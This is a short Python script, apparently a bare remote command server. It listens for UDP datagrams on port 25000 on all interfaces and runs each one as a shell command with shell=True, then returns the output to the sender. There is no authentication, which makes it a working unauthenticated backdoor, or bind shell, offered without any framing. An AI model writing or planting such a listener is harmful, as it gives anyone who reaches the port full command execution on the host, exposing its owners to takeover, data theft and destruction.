import socket
import subprocess

UDP_IP = "0.0.0.0"
UDP_PORT = 25000

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.bind((UDP_IP, UDP_PORT))

print(f"Listening on UDP port {UDP_PORT}...")

while True:
    data, addr = sock.recvfrom(1024)
    command = data.decode('utf-8')
    print(f"Received command: {command} from {addr}")

    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        response = result.stdout if result.stdout else result.stderr
    except Exception as e:
        response = f"Failed to execute command: {e}"

    sock.sendto(response.encode('utf-8'), addr)
    print(f"Sent response: {response} to {addr}")